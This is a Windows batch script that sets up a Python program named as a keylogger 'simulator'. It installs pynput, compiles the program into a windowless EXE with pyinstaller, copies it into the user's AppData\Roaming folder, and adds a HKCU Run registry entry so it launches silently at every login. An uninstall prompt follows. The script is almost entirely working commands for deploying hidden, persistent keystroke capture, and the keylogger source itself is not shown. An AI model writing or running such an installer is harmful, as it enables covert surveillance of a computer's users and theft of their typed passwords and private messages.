@echo off
setlocal
echo -------------------------------------------------- >> setup_log.txt
echo [STARTING SETUP] %DATE% %TIME% >> setup_log.txt

:: Step 1 - Check for Python
echo Checking Python...
python --version >nul 2>&1 || (
    echo Python is not installed! Please install Python 3.8 or later.
    pause
    exit /b 1
)

:: Step 2 - Create and activate virtual environment
echo Creating virtual environment...
python -m venv venv
call venv\Scripts\activate

:: Step 3 - Install requirements
echo Installing required packages...
python -m pip install --upgrade pip
pip install -r requirements.txt

:: Step 4 - Verify pynput installation
python -c "import pynput" >nul 2>&1 || (
    echo Error: Failed to install pynput. Please try running:
    echo pip install pynput --force-reinstall
    pause
    exit /b 1
)

:: Step 5 - Build the EXE
echo Building keylogger_simulator.exe...
pyinstaller --noconsole --onefile keylogger_simulator.py >> setup_log.txt 2>&1

:: Step 6 - Move EXE to AppData\Roaming
set KEYLOGGER_EXE=%USERPROFILE%\AppData\Roaming\keylogger_simulator.exe
echo Moving EXE to %KEYLOGGER_EXE%
move /Y dist\keylogger_simulator.exe "%KEYLOGGER_EXE%" >> setup_log.txt 2>&1

:: Step 7 - Add to Windows Startup (Registry)
echo Adding to registry for auto-start...
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v KeyloggerSim /t REG_SZ /d "%KEYLOGGER_EXE%" /f >> setup_log.txt 2>&1

:: Step 8 - Done
echo Setup complete! Keylogger will run on next login. >> setup_log.txt
echo [COMPLETED] %DATE% %TIME% >> setup_log.txt

:: Step 9 - Check if already running
tasklist | find /i "keylogger_simulator.exe" >nul 2>&1 && (
    echo Keylogger is already running. >> setup_log.txt
    echo Keylogger is already running. Do you want to uninstall it? (Y/N)
    set /p choice=
    if /i "%choice%"=="Y" (
        echo Uninstalling keylogger...
        REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v KeyloggerSim /f >> setup_log.txt 2>&1
        del "%KEYLOGGER_EXE%" >> setup_log.txt 2>&1
        echo Keylogger uninstalled successfully. >> setup_log.txt
        echo Uninstallation complete.
        exit /b
    )
)

echo Done.
pause
endlocal